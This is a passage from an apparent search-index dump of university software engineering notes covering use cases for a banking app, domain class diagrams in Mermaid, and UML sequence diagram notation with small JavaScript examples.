</p>"},{"location":"notes/l4_1_software_development_process/#summary","title":"Summary","text":"<p>In summary we have covered software development processes and types.  We discussed what UML models could used in different phases of software development life cycle. </p>"},{"location":"notes/l4_2_use_case/","title":"50.003 - Use Case","text":""},{"location":"notes/l4_2_use_case/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to</p> <ol> <li>Describe the different components of a use case.</li> <li>Describe the different components of a use case diagram.</li> <li>Analyse the given system requirements using use cases and use case diagrams. </li> </ol>"},{"location":"notes/l4_2_use_case/#use-case","title":"Use case","text":"<p>A use case (or a use case text, or use case document) captures a particular scenario or related scenarios in a user-system interaction. Our goal to find out all relevant user-system interaction in the existing system to be fixed and in the newly proposed system that the users want us to build. </p>"},{"location":"notes/l4_2_use_case/#an-example-banking-app","title":"An example - Banking App","text":"<p>Consider the following user interaction with a Banking App</p> <p>Although in general there is no fixed format of use case text documents, for consistency, we try to adhere to the following convention. </p>  ID:   UC1   Name:   Login   Description:   Customer Logins to the Bank App   Created By:   Dileepa Fernando  Date Created:  1st May 2025   Last Updated By:   Dileepa Fernando   Date Updated:   3rd May 2025   Actors:   Customer   Triggers:   Customer opens the Bank app and clicks on login button in the initial screen   Preconditions:   Customer Not logged in and Bank app installed   Postconditions:        1. Customer authenticated and logged in      2. The customer can access the account   Error States:        1. Customer not authenticated      2. The customer cannot access the account      3. Login error shown      Flow:       1. Customer enters the password.      2. Customer clicks the login button      3. System validates credentials       4. System shows the dashboard   ...  <p>In the table above, we define the use case. All non-italic fields are mandatory.  * For tracking purpose, every use case should be given a unique ID and a informative name.  * The description summarizes the gist of the user-system interaction * Though optional (hence in italic), it is also good to keep track of the creator and updater's names and the dates. * The actors field includes a set of actors involved in this interaction. In this example, the customer is the primary actor since she is the one who is benefitted mainly. When an actor initiates such a use case, we refer to it as a base use case.  The other supporting actors to the base use case are considered secondary actors. Every use case should have at least one actor. We can choose to distinguish between primary and secondary actors.</p> <ul> <li>The triggers field describes what activates this use case, which can be a user action or another user case's action. </li> <li>The preconditions field includes a list of mandatory criteria/ system state must be met before this user-system interaction is initiated. Sometimes, if a precondition is a common to a set of use cases, we convert it into a common requirement field.</li> <li>The postconditions field includes a list of possible output states when the use case completes successfully</li> <li>The error states field capture the failed outcomes and optionally a general description of how failed outcomes are handled. </li> <li>The flow contains a sequence of actions performed by the actors in chronological order. </li> </ul> <p>Note that there is the <code>...</code> in the above table, and there is no visible way to trigger the failed postcondition. This is because the use case is incomplete. </p> <p>Suppose the user requirement continues as follows.</p> <p>\" If the user credentials are invalid system should prompt invalid credentials message \"</p> <p>With this we continue our use case as follows</p>  ID:   UC1   Name:   Login   Continue from the previous table   Alternative Flow:  3'. The customer enters wrong credentials.   6'. System prompts invalid credentials message   <p>In the above, we specify the alternative flow. In the event of either of the alternative-flow actions occur, the error states will be result. In this case, user authentication fails. Main flow is 1,2,3,4,5,6 while alternative flow is 1,2,3',4,5,6'.</p> <p>Now next consider another paragraph of user requirement. </p> <p>\" The customer selects the Transfer menu from the banking application. The system displays the Transfer Funds screen. The customer enters the recipient\u2019s account number, account details, and the amount to transfer. After confirming the information, the customer clicks the Confirm button. The system prompts the customer to enter a one-time password (OTP). The system sends the OTP via SMS using the SMS Gateway. The customer receives the OTP and enters it into the system. Upon successful verification, the system transfers the specified fund amount to the recipient\u2019s account and reduces the customer\u2019s account balance accordingly. The system displays a success message confirming the transfer.</p> <p>If the customer initially enters an invalid account number or incorrect details, the system displays an error message. After acknowledging the message, the customer can retry the process by returning to the Transfer Funds screen. \"</p>  ID:   UC2   Name:   Transfer Funds   Description:   Customer transfers money from her account to another account   Created By:   Dileepa Fernando  Date Created:  1st May 2025   Last Updated By:   Dileepa Fernando   Date Updated:   3rd May 2025   Actors:   Customer, SMS Gateway   Triggers:   The Customer clicks on Transfer menu   Preconditions:   Customer is logged in and authenticated   Postconditions:        1. the customer transfers the mentioned fund value to the selected recipient     2. The customer's balance is reduced by the mentioned fund value       Error States:    Fund transfer fail      Flow:       1. Customer clicks on transfer menu.      2. System shows transfer screen.      3. Customer enters recipient account number and details.      4. Customer enters the amount to transfer.      5. Customer may choose to add a note      6. Customer clicks on confirm button.      7. System validates the account details and checks the balance      8. System prompts the customer to enter the OTP.      9. System sends the OTP by SMS.      10. Customer enters the OTP.       11. System validates the OTP.      12. System shows the transfer success message.        Alternative Flow:           Invalid Account Details:     1-7 (main flow),8.System shows 'Invalid Account Details' message      9. User clicks the message, go to step 2      Insufficient Balance:     1-7 (main flow),8.System shows 'Insufficient Balance' message      9. User clicks the message, go to step 2      Authentication Failed:     1-11 (main flow),12.System shows 'Authentication Failed' message      13. User clicks the message, go to step 8  <p>In the above use case, we find the Customer as the primary actor, and the SMS gateway as the secondary actor. </p>"},{"location":"notes/l4_2_use_case/#use-case-diagram","title":"Use Case Diagram","text":"<p>Use case diagrams allow us to organize the related use cases into a single diagram. It is like the bird-eye's view. </p> <p>Now we have two use cases. We can summarize them into the following use case diagram</p> <p> * The rectangle box denotes the system boundary. * Each stick man denotes an actor.  * Each oval bubble denotes a use case.  * The solid lines denote the association between an actor and a use case. Note that in our notation we do not visually distinguish a primary actor from the secondary actors. We can also infer or clarify using the use case texts. </p>"},{"location":"notes/l4_2_use_case/#extend-relationship","title":"Extend Relationship","text":"<p>There are scenarios in which we want to include an optional sub use case of the base use case.</p> <p>When a use case <code>E</code> extends  a use case <code>B</code>, <code>E</code> is an optional step in <code>B</code>, in other words, <code>B</code> can be completed with or without <code>E</code> being triggered. </p> <p>To put it into a concrete example, let's consider a use case text as follows</p>  ID:   UC3   Name:   Add Note   Description:   The customer adds a note on the fund transfer   Created By:   Dileepa Fernando  Date Created:  1st May 2025   Last Updated By:   Dileepa Fernando   Date Updated:   3rd May 2025   Actors:   Customer   Triggers:   The customer accesses add note interface   Preconditions:   The customer is accessing the transfer funds interface and have not confirmed it    Postconditions:        Note about the transfer funds is recorded   Error States:    nil      Flow:       1. The customer enters a note       2. The customer clicks submit      3. The system shows back the transfer funds screen   Alternative Flow:       nil  <p>We can make <code>UC3</code> extends to <code>UC1</code>.  Note that the extension use case and the base use case should have the same primary actor. </p>"},{"location":"notes/l4_2_use_case/#include-relationship","title":"Include Relationship","text":"<p>Sometimes we need to include a mandatory sub use case into another use case so that we can reuse the common routine (it is kind of like a function call).</p> <p>Suppose the following extension to the  project requirements </p> <p>The system needs to verify that it is the same customer who logged in before proceeding with a senstive transaction such as fund transfer or viewing the bank statement. For this purpose system sends an OTP to the legitimate customer's mobile phone via SMS and prompts customer to enter the OTP. Upon validation, system proceeds to process the sensitive request. Note that UC4 below can be shared among any future usecases which necessitates authentication before proceeding which helps reusability in the use case diagram.</p>  ID:   UC4   Name:   Authenticate   Description:   The system authenticates customer before a sensitive transaction   Created By:   Dileepa Fernando  Date Created:  1st May 2025   Last Updated By:   Dileepa Fernando   Date Updated:   3rd May 2025   Actors:   Customer   Triggers:   System prompts the customer to enter the OTP   Preconditions:   Customer is in progress with transfer fund    Postconditions:        Customer succesfully authenticated       Error States:    Customer authentication unsuccessful      Flow:       1. System sends the OTP by SMS.      2. Customer enters the OTP.       3. System validates OTP.      4. System shows transaction successful message.       Alternative Flow:       4'. System shows authentication failed message      5'. Go to step 1  <p></p> <p>Note that when a use case <code>A</code> includes another use case <code>B</code>, <code>B</code> is a mandatory step in <code>A</code>, <code>A</code> and <code>B</code> must be sharing the same primary actor.</p>"},{"location":"notes/l4_2_use_case/#other-relationships","title":"Other relationships","text":"<p>There exist other relationships in use case diagrams. </p> <p>For instance,</p> <ul> <li>Inheritance relation among use cases to allow a use case <code>A</code> to inherit the base  use case <code>B</code> by sharing the same results with different behaviors. </li> <li>Inheritance relation among actors to allow multiple actors to share the same base actor's use cases. </li> </ul> <p>We omit the details for these relationships and encourage you to self explore them in the text references. </p>"},{"location":"notes/l4_2_use_case/#deriving-use-case-text-and-use-case-diagram","title":"Deriving Use Case Text and Use Case Diagram","text":"<p>To derive the use case diagram, we could either find out the answers of the following questions through documentation study or user study.</p> <p>We should first define the system boundary. It will help us to identify actors and relevant use cases.</p> <p>To identify whether a component belong to the system, we need to find out 1. Do you/your team implement this part? 1. Do user goals fail without this part?</p> <p>To identify the actors of the system, we need to find out</p> <ol> <li>Who are the users of the system?</li> <li>Who are responsible for the system administration? </li> <li>Who is interested in the tasks results?</li> <li>Do they need any external devices/sub-systems which the system communicates?</li> </ol> <p>To define the use case and use case text, we need to find out</p> <ol> <li>What are the main tasks that an actor perform?</li> <li>Does the actor query or retrieve information from the system?</li> <li>Does the actor need to inform the system the changes in other external system?</li> <li>Should an actor be informed about unexpected events within the system?</li> </ol> <p>Given a use case and an actor of the system, how to identify its actor type within the usecase? 1. Does the entity interact (initiate of respond) with the system. 2. Does the entity qualify as an actor and use case goal is the actor's goal? Then it is a primary actor. 3. Does the entity qualify as an actor, only responds to system and it only supports to achieve use case goal? Then it is a secondary actor.</p> <p>After going through the above questions (some times a few rounds), we can map out all the actors, and the main use cases (the oval bubbles) and their relationship. </p> <p>For each individual use case, we then need to find out what the exact sequence of actions a user needs to perform to complete the use case. </p> <p>Note that use case is a tool for communication, it is not a mathematical statement. The quality of a use case is determined by how effective it conveys the information. </p> <p>For instance, in our running example, we could have combine <code>UC1</code> and <code>UC2</code> into one bigger use case. However for now we believe that having them separate helps us to describe the system requirements better.</p> <p>At least, I find it easier for me to explain how use case works in this way. =). </p>"},{"location":"notes/l4_2_use_case/#optional-use-case-vs-user-story","title":"(Optional) Use case vs User story","text":"<p>User story (AKA feature) is another form of capturing the user requirements. It is often used in combination with iterative style development processes. </p> <p>Contrasting with use case, user stories are more specific to system functionality rather than the user-system interation. Use cases are more \"narrative\" than user stories and providing a bigger picture. User stories are often more fine-grain than use cases and are helpful for us to divide the development tasks.</p> <p>We can use both when approriate, for instance, we could start with use cases, then we break down the use cases into smaller user stories. Another way could be starting with user stories, then we can reconstruct the use cases by organizing all the user stories created. </p>"},{"location":"notes/l4_2_use_case/#summary","title":"Summary","text":"<p>In this we studied use case texts and use case diagrams and how to apply them to describe the system requirements. </p>"},{"location":"notes/l5_1_class_diagrams/","title":"50.003 - Class Diagrams","text":""},{"location":"notes/l5_1_class_diagrams/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to</p> <ol> <li>Explain the concept of Problem Domain.</li> <li>Explain the concept of Domain model.</li> <li>Explain the Relationships, Associations, Multiplicity and Association class</li> <li>Derive a Domain Model for a given problem.</li> </ol>"},{"location":"notes/l5_1_class_diagrams/#problem-domain","title":"Problem Domain","text":"<p>Understanding problem domain is essential before designing a software system to solve a given problem. The problem domain refers to the specific area of expertise or application relevant to the problem being addressed. It includes the real-world concepts that users interact with such as products, orders, invoices, customers, deliveries etc.</p> <p>When it comes to developing software system, we need to identify the context of the system being developed. For example, if we need an order management system, the context defines the entities in the order management like products, order, invoices etc.</p> <p>The context helps to define the scope of the system being developed. For example, for an order management system, we may not consider the venue as a part of the system.</p>"},{"location":"notes/l5_1_class_diagrams/#domain-concepts","title":"Domain Concepts","text":"<p>We can visualize domain concepts in categories. This will help defining system boundaries and identify entities and relationships separately for the problem domain model described next.</p>"},{"location":"notes/l5_1_class_diagrams/#problem-domain-model","title":"Problem Domain Model","text":"<p>A Problem Domain Model is a structured representation of real-world business concepts. It serves as a foundation for understanding the system's environment and helps guide requirements and design decisions. The domain model stems from the refined scope in \"Problem Domain\" defined previously.</p> <p>Problem domain model defines the concepts in problem domain as entities and relationships. It may take the form of simple diagrams, glossaries etc. which enhances clarity of the problem domain identified. Problem domain model is still an abstract representation which need to be filled with more details.</p>"},{"location":"notes/l5_1_class_diagrams/#domain-class-diagram","title":"Domain Class Diagram","text":"<p>Domain class diagram formally shows a problem domain model. Each class represents an entity in the problem domain model and the corresponding attributes (Ex: In an order management system - Customer, Order). Class diagram also shows the relationships between the domain classes (Ex: In an order management system, Customer places Order shows the relationship between Customer and Order). Note that behaviors like \"register (customer), cancel (order)\" are not modelled in domain class diagram. In contrast, solution class diagram (different from domain class diagram) models entities and relationships of the system implemented, with added details of the entity behavior.</p>"},{"location":"notes/l5_1_class_diagrams/#domain-class-notation","title":"Domain Class Notation","text":"<p>Class diagram represents classes with a rectangle with 3 splits. The text in the splits (from top to bottom) represent class name, class attributes and behaviors respectively. </p> <p>Attributes are variables denoting specific details about the class. In case of domain class diagram, the bottom is empty since the behaviors are not represented.</p> <p>The following example shows three domain classes in an order management system.</p> <p><pre><code>---\ntitle: Order management system\n---\nclassDiagram\n    class Customer{\n    -custNumber\n    -address\n    -phone\n     -order: Order\n    }\n\n\n    class Order{\n      -orderID\n     -orderDate\n      -cust:Customer\n    -amount\n    -item:OrderItem\n\n    }\n\n    class OrderItem\n    OrderItem : -itemID\n    OrderItem : -quantity\n    OrderItem : -price</code></pre> Note that attributes are variable names not the exact values. In this example each class contains a unique identifier as an attribute (custNumber, orderID, itemID).</p>"},{"location":"notes/l5_1_class_diagrams/#domain-class-relationships-and-notation","title":"Domain Class Relationships and Notation","text":"<p>There can be different relationships among the domain classes.</p> <p>Inheritance - When a class A is a kind of class B, we say that \"class A inherits class B\". See the notation below. <pre><code>classDiagram\n  classA --|&gt; classB</code></pre></p> <p>For example, we can add a new class (onlineOrder) and show that it is another Order type. <pre><code>---\ntitle: Order management system\n---\nclassDiagram\n    OnlineOrder --|&gt; Order\n\n    class Customer{\n    -custNumber\n    -address\n    -phone\n     -order: Order\n    }\n\n\n    class Order{\n      -orderID\n     -orderDate\n      -cust:Customer\n    -amount\n    -item:OrderItem\n\n    }\n\n\n    class OnlineOrder\n    OnlineOrder : -orderID\n    OnlineOrder : -platformName\n    OnlineOrder : -orderDate\n    OnlineOrder : -amount\n\n    class OrderItem\n    OrderItem : -itemID\n    OrderItem : -quantity\n    OrderItem : -price</code></pre> In code, <pre><code>class OnlineOrder extends Order{\n  //your code\n}\n</code></pre> Dependancy - A dependancy is a linkage among different classes implying one class uses/depends on another class. Even a temporary action like passing an object from classA to a method of classB is considered as dependancy. This can be denoted by a dotted arrow drawn from classB to classA, which is read as \"classB uses classA\".</p> <p><pre><code>classDiagram\n  classA &lt;.. classB</code></pre> We provide code examples in design class diagram lesson, when we discuss adding methods to a class diagram.</p> <p>Association - An association is a stronger form of dependancy which necassitates one class having a reference to another class as an attribute. Having such a reference is called Navigability. If classA has a reference of classB, then we say, \"classA can navigate to classB\" and in other words, \"classA has classB\"</p> <p>When the navigation is to a single direction, we have a unidirectional association. Additionally, having mutual navigability defines a bidirectional association. </p> <p><pre><code>classDiagram\n  classA --&gt; classB</code></pre> In code,</p> <p><pre><code>class Customer{\n  constructor(order){\n    this.order= order//order is an object of Order\n  }\n}\n</code></pre> Also see the extended example for order management system.</p> <p><pre><code>---\ntitle: Order management system\n---\nclassDiagram\n    OnlineOrder --|&gt; Order\n    Customer -- Order\n    Order --&gt; OrderItem\n    class Customer{\n    -custNumber\n    -address\n    -phone\n     -order: Order\n    }\n\n\n    class Order{\n      -orderID\n     -orderDate\n      -cust:Customer\n    -amount\n    -item:OrderItem\n\n    }\n\n\n    class OnlineOrder\n    OnlineOrder : -orderID\n    OnlineOrder : -platformName\n    OnlineOrder : -orderDate\n    OnlineOrder : -amount\n\n    class OrderItem\n    OrderItem : -itemID\n    OrderItem : -quantity\n    OrderItem : -price</code></pre> In the order management example, the unidirectional arrow from Order to OrderItem represent that an Order has order item object. The non directional arrow (representing bi-directional) is to explicitly represent mutual access between Customer and Order (Customer maintains the Orders, Order maintains the corresponding Customer) in their structures mutually.</p> <p>Further refinements can be done for the directional associations mentioned above. They can be classified as aggregation or composition which denote whole-part relationships.</p> <p>Aggregation : Aggregation is a directional association from classA to classB which says classA is a part of classB and classA can also operate independent of classA.  </p> <p><pre><code>classDiagram\n  classA --o classB</code></pre> Semantically, it adds a stronger link to the has-a relationship. \"Customer has Order\" and \"Order has OrderItems\" are both associations. However, \"OrderItems are a part of Order\" and \"Order is not a part of Customer\". Additionally, \"OrderItem can operate independantly of Order\".</p> <p>In most programming language syntax, association and aggregation are shown in a similar way. We need more context (\"has-a\" or \"is-part-of\") to differentiate them.</p> <p>in code, <pre><code>class Customer{\n  constructor(order){\n    this.order.add(order) //order object is a part of customer object and outlives customer\n  }\n}\n</code></pre></p> <p>Composition : Composition is a directional association from classA to classB which says classA is a part of classB. This is a stronger association than aggregation. In composition classB object is created by classA object while classB object is destroyed when the classA object is destroyed. Therefore the life cycle of classB object is bounded by the life cycle of classA.</p> <p>In code,</p> <p><pre><code>class Order{\n  constructor(name,amount){\n    this.orderitems.add(new OrderItem(name,amount)) //orderitem is a part of Order, when order deleted, orderitem also deleted\n  }\n}\n</code></pre> Note that diamond head in aggregation/composition is in the opposite direction of the arrow head in association because, has-a relationship and is-part-of relationships are in opposite directions. We ignore the association arrow at the opposite side because aggregation is a stronger relationship. <pre><code>classDiagram\n  classA --* classB</code></pre></p> <p>If the association is bi-directional and one direction (classA to classB) has aggregation, we can show it as below diagram.  1. strong association from classB to classA (aggregation from classA to classB) </p> <ol> <li>General association from classA to classB. <pre><code>classDiagram\n  classA --* classB\n  classA --&gt; classB</code></pre></li> </ol> <p>Check the order management system example with  composition and aggregation.</p> <pre><code>---\ntitle: Order management system (Tightly coupled)\n---\nclassDiagram\n    OnlineOrder --|&gt; Order\n    Customer --o Order\n    Customer--&gt; Order\n    Order --&gt; OrderItem\n    class Customer{\n    -custNumber\n    -address\n    -phone\n     -order: Order\n    }\n\n\n    class Order{\n      -orderID\n     -orderDate\n      -cust:Customer\n    -amount\n    -item:OrderItem\n\n    }\n\n\n    class OnlineOrder\n    OnlineOrder : -orderID\n    OnlineOrder : -platformName\n    OnlineOrder : -orderDate\n    OnlineOrder : -amount\n\n    class OrderItem\n    OrderItem : -itemID\n    OrderItem : -quantity\n    OrderItem : -price</code></pre> <p><pre><code>---\ntitle: Order management system (Low coupling)\n---\nclassDiagram\n    OnlineOrder --|&gt; Order\n    Customer o-- Order\n    Order *-- OrderItem\n    class Customer{\n    -custNumber\n    -address\n    -phone\n     -order: Order\n    }\n\n\n    class Order{\n      -orderID\n     -orderDate\n    -amount\n    -item:OrderItem\n\n    }\n\n\n    class OnlineOrder\n    OnlineOrder : -orderID\n    OnlineOrder : -platformName\n    OnlineOrder : -orderDate\n    OnlineOrder : -amount\n\n    class OrderItem\n    OrderItem : -itemID\n    OrderItem : -quantity\n    OrderItem : -price</code></pre> The composition relationship between Order and OrderItem is modelled in both diagrams. The aggregation relationship between Customer and Order are modelled since order object is a part of the customer object. We do not remove the order objects even if the corresponding customer object is removed.</p>"},{"location":"notes/l5_1_class_diagrams/#non-binary-associations-and-notation","title":"Non binary Associations and Notation","text":"<p>All the associations we covered above are binary associations where exactly two classed were associated. There are other types of associations such as Unary, Ternary, and most generally n-ary.</p> <p>Here, we precisely define the association between class A and class B in terms of class A objects and class B objects. Association between class A and class B means, some objects of class A associate with one or more objects of class B. </p> <ol> <li> <p>In Unary association a class associates with itself. In other words object of a given class can associate with another object of the same class. It is shown by a self directed edge.    <pre><code>    classDiagram\n        Person -- Person : is married to\n    class Person</code></pre>   In the above example, there are objects in the person class where each of them are married to another person(s). We can also represent the bounds for the number of associated objects. This is called multiplicity and will be discussed in the next section.  </p> </li> <li> <p>In Ternary association, three classes can associate together. In other words 3 objects from each class can be associated.</p> </li> </ol> <p></p> <p>In the above example, an association can be defined as a supplier supplies a product to a store.</p>"},{"location":"notes/l5_1_class_diagrams/#multiplicity-in-associations-and-notation","title":"Multiplicity in Associations and Notation","text":"<p>Given a binary association classA -- classB, for a chosen object in classA, it can interact with zero or more objects in classB. This is the most general case. The multiplicity labels defines precise lower and upper bounds for the number of associated objects in classB.</p> <p>Consider the association between Order and OrderItem. Given 1 Order, there can be 1 or more Order items assuming Order is created only when there is a non empty list of OrderItems. This is represented in the Fig: 1, with \"1\" at the Order end and \"1..*\" at the OrderItem end. \"1..*\" means the minimum number of OrderItems is 1 and the maximum number of OrderItems can be any number (represented by the placehoder \"*\")</p> <p>Similarly Fig: 2 denotes what is the minimum and maximum number of Orders exist for 1 OrderItem. Since there is exactly one Order for a given OrderItem, we show \"1\" at the Order end which is short hand for \"1..1\" (meaning min of 1 and max of 1).</p> Fig: 1 OrderItems per Order Fig: 2 Orders per OrderItem <p>To obtain the combined multiplicity diagram we remove the Order end \"1\" from Fig: 1 and OrderItem end \"1\" from Fig: 2. Then we have the combined multiplicity diagram as Fig 3 below.</p> Fig: 3 Combined Multiplicity"},{"location":"notes/l5_1_class_diagrams/#association-class-and-notation","title":"Association Class and Notation","text":"<p>Some times, the association between two classes have some details worth modelling in the class diagram itself. This modelling is done via a separate class connected via a dashed line to the association link. </p> <p>An example could be an existing association between a Student and a CourseSection. The student's grade for a CourseSection is neither an attribute of Student nor an attribute of CourseSection. The grade attribute belongs to the association between the Student and the CourseSection which we name as CourseEnrollment.</p> <p></p> <p>The following table shows the different types of multiplicities that can be represented in a class diagram.</p> Multiplicity Meaning 1 One and only One 1..X Min 1 and Max X 1..* Min 1 and Max many 0..X Min 0 and Max X * Min 0 and Max many"},{"location":"notes/l5_1_class_diagrams/#derive-a-domain-class-diagram","title":"Derive a Domain Class Diagram","text":"<ol> <li> <p>Extract Candidate Classes: Analyze the use case descriptions to identify nouns and noun phrases, which often correspond to potential classes. Focus on entities that play a role in achieving the use case goals. (Ex: \"Customer,\" \"Account,\" and \"Transaction\")</p> </li> <li> <p>Determine Class Attributes and Relationships: For each identified class, determine its relevant attributes and how it relates to other classes. (Ex: \"Account\" class attributes \"accountNumber\", \"balance\"; Account class Associated with \"Customer\" class.)</p> </li> <li> <p>Create the Domain Class Diagram: Using the classes, attributes, relationships, construct the domain class diagram. </p> </li> </ol>"},{"location":"notes/l5_1_class_diagrams/#derive-a-domain-class-diagram-for-transfer-funds","title":"Derive a Domain Class Diagram for Transfer Funds","text":"<ol> <li> <p>Use Case Goal: Enable a customer to transfer funds between accounts.</p> </li> <li> <p>Identified Classes and Attributes:</p> <ol> <li>Customer: customerId, name, email, account</li> <li>Account: accountNumber, balance, Transaction</li> <li>Transaction: transactionId, amount, date, fromAccount, toAccount</li> </ol> <p> </p> </li> <li> <p>Relationships:</p> <ol> <li> <p>A customer has an account or multiple accounts. An account can associate with a single customer (If we ignore joint accounts). We show a general association from Customer to Account.</p> </li> <li> <p>An account is a part of transaction. An Account can be involved zero or more Transactions. A transaction relates to exactly two accounts.  We show an aggregation relationship from Transaction to Account since transaction can outlive the accounts involved.</p> </li> </ol> <p></p> <p>We show the multiplicity requirements as follows.</p> <p></p> <p>It should be noted that the choice of the nature of association (Dependancy, Association, Aggregate, Composition) depends on the specific requirements and design considerations.</p> <p>It is possible to include a list of transactions as an attribute in Account class here. Here, we leave it for solution class diagram, which is closer to the implementation.</p> </li> </ol>"},{"location":"notes/l5_2_sequence_diagrams/","title":"50.003 - Sequence Diagrams","text":""},{"location":"notes/l5_2_sequence_diagrams/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to</p> <ol> <li>Define a UML sequence diagram</li> <li>Describe elements of UML sequence diagram</li> <li>Identify the elements of a given UML sequence diagram</li> </ol>"},{"location":"notes/l5_2_sequence_diagrams/#sequence-diagram-introduction","title":"Sequence Diagram - Introduction","text":"<p>A sequence diagram is an interaction diagram that details how operations are carried out. It shows how objects communicate with other objects to invoke methods/constructors in a sequential manner. These communications are shown as messages. A sequence diagram typically represents a single use case or a specific scenario.</p> <p>By using a Sequence Diagram you can;</p> <ol> <li> <p>Visualize message flow. Sequence diagrams clarify how different system parts interact and what messages they exchange.</p> </li> <li> <p>Document system behavior. Sequence diagrams document a system\u2019s behavior, making it easier to understand how it works and identify potential issues.</p> </li> <li> <p>Identify errors. Sequence diagrams can help identify potential errors in the system by highlighting miscommunications or unexpected interactions between objects.</p> </li> <li> <p>Improve communication. Sequence diagrams provide a common language for developers, designers, and other stakeholders to discuss system interactions.</p> </li> </ol> <p>A sequence diagram consists of two axes namely, object axis and time axis which interpretes the participants and relative order given a message. Object axis shows different objects involved in the task under consideration (can be derived from class diagram). Time axis shows the relative ordering. i.e. messages represented lower in the time axis happen later (See below) . </p>"},{"location":"notes/l5_2_sequence_diagrams/#elements-of-a-sequence-diagram","title":"Elements of a Sequence Diagram","text":"<p>The following are the main elements of a sequence diagram.</p> <ol> <li> <p>Actor - Actor is an external entity interacting with the system. For a given use case, the sequence diagram can reuse the same set of actors.</p> </li> <li> <p>Object - An object is an internal entity involved in an interaction. The interaction can be between participants or between a participant and an actor.</p> </li> <li> <p>Lifeline - A life line is a vertical dashed line starting from a participant (object or actor) indicating  the existence of the participant over time.</p> </li> <li> <p>Messages - Messages indicate communication between two participants (e.g., method calls, constructors, returning results) by an arrow and a message label. Arrow starts from the lifeline of the message sender and ends at the lifeline of the message recipient.</p> </li> <li> <p>Activation Bar - Time during which an object is active and denoted by a vertical thin rectangle . This typically indicate the duration taken by the object to perform the task specified. Activation bar appears at the point of receiving the message. End of the activation bar indicates end of the execution of the task initiated by the message.                                                                             </p> </li> </ol>"},{"location":"notes/l5_2_sequence_diagrams/#notation-for-sequence-diagram-elements","title":"Notation for Sequence Diagram Elements","text":"<p>See below for visual representations of sequence diagram elements introduced above.</p> Actor and Lifeline Participants and Lifelines Activation after Message"},{"location":"notes/l5_2_sequence_diagrams/#notation-for-sequence-diagram-messages","title":"Notation for Sequence Diagram Messages","text":"Synchronous Message Asynchronous Message <p>Synchronous message and Asynchronous message are represented solid arrows. For synchronous message, the arrow head is dark while for the asynchronous message the arrow head is not dark. When this arrow meets the receiving life line, an activation bar can be activated optionally.</p> <p>They represent synchronous and asynchronous methods invokations respectively.</p> Return Message <p>Return message is shown by a dotted arrow with a dark or non dark arrow head (depending on the asynchronous nature) from life line 2 to life line 1. Return message always has a corresponding synchronous or asynchronous message sent from life line 1 to life line 2 (opposite direction). If this corresponding message activated an activation bar at life line 2, it should be deactivated at the beginning of return message arrow.</p> <p>A return message refers to returning a value from an invoked method. </p> Create Message Destroy Message <p>A create message is a special type of a synchrounous message which represents an invokation of object constructor. The arrow starts from life line 1, and ends at a newly created life line 2.</p> Self Message <p>A self message is a message from a life line to itself denoted by a looping arrow. Optionally we can show a nested activation bar from the start of the arrow to the end of the arrow.</p> <p>A self message represents an object/class method calling another method (or the same method) in the same class.</p> Found Message Lost Message <p>In found message and lost message, one party involved in the communication is external to the system. The found messge is shown by an arrow starting from outside the system boundary and ending at a life line while a lost message is shown by an arrow starting from a lifeline and ending outside the system boundary.</p> Duration Message <p>Duration message is shown as a downslanted arrow in contrast to straight horizontal arrow in other messages. </p> <p>This means the network/processing delay of the method represented is significant and needs to be highlighted.</p>"},{"location":"notes/l5_2_sequence_diagrams/#notation-for-composed-sequence-diagram-elements","title":"Notation for Composed Sequence Diagram Elements","text":"Conditional composition <p>Conditional composition is shown by a rectangle with the top left header 'alt' (meaning alternatives). The rectangle is split to multiple horizontal sub rectangles by dotted lines. Each sub rectangle represents a sequence of messages communicated under a given condition, specified on top within square brackets.</p> Loop composition <p>Loop composition is shown by a rectangle with the top left header 'loop'. The iterating parameter is specified within square brackets on top.</p> Parallel composition <p>Parallel composition is shown by a rectangle with the top left header 'par' (meaning parallel). The rectangle is split to multiple horizontal sub rectangles by dotted lines. The sequence of messages contained in each sub rectangle are said to be communicated in parallel (independantly).</p>"},{"location":"notes/l5_2_sequence_diagrams/#possible-implementation-of-sequence-diagram-elements","title":"Possible implementation of Sequence Diagram Elements","text":""},{"location":"notes/l5_2_sequence_diagrams/#messages","title":"messages","text":"<ol> <li>Synchronous message</li> </ol> <p>A synchronous message is a method invokation of the recipient object which waits for the return message before advancing to the next operation. In other words, current line and next operation execute one after the other (Synchronous). </p> <p>In the below code example, the method add(a,b) called in calc object and the next operation is assigning it to result. Here add(a,b) and the assigment operation happens one after the other (i.e. Synchronously). <pre><code>class Calculator { \n    add(a, b) { \n        return a + b; \n    } \n}\nconst calc = new Calculator(); \nconst result = calc.add(5, 3); // Synchronous call\n</code></pre> 2. Asynchronous message</p> <p>Asynchronous message is a method invokation of recipient object (api) which does not wait for the return message before advancing to the next operation. In other words, current line and next operation can concurrently execute (Asynchronous). </p> <p>Here, fetch('/api/dataB') is called before resolving the promise for fetch('/api/dataA') meaning both fetch methods running in the background concurrently.</p> <p><pre><code>async function fetchData(Api api) {\n  const promiseA = api.fetch('/api/dataA'); // async call\n  const promiseB = api.fetch('/api/dataB'); // async call\n  //const dataA = await promiseA;\n  //const dataB = await promiseB;\n}\n</code></pre> 3. Return message</p> <p>Return message represents returning back to the calling object with or without a result. </p> <p>In the code example below, calling object invokes 'fetchData()' on 'fet' object. 'fet' object sends the return message 'Data fetched'. <pre><code>class Fetch{\n  function fetchData() { \n    return 'Data fetched'; \n  }\n}\n\nlet fet= new Fetch();\nconst data = fet.fetchData(); // Return message with 'Data fetched'\n</code></pre> 4. Create message</p> <p>A create message is a message sent for starting a lifeline (new object).</p> <p>In the below code example, the 'new User('Alice')' object is created. <pre><code>class User { \n    constructor(name) { \n        this.name = name; \n    } \n} \nconst newUser = new User('Alice'); // Create message\n</code></pre> 5. Destroy message</p> <p>Destroy message is sent to destroy an object so that it is not available for use afterwords. </p> <p>In the code example below, User object is created first via a create message. Later, Controller class's terminate method is used to destroy that User object. <pre><code>class User {\n  constructor(name) {\n    this.name = name;\n  }\n\n  terminate() {\n    // cleanup actions\n    console.log(`${this.name} is terminated`);\n  }\n}\n\nclass Controller {\n  static destroyUser(user) {\n    user.terminate();\n    return null; // Simulating destruction\n  }\n}\n\nlet tempUser = new User('Bob');\ntempUser = Controller.destroyUser(tempUser); // Destroy message from Controller\n</code></pre> 6. Self message</p> <p>Self message is a message sent by an object to itself. In code, any internal 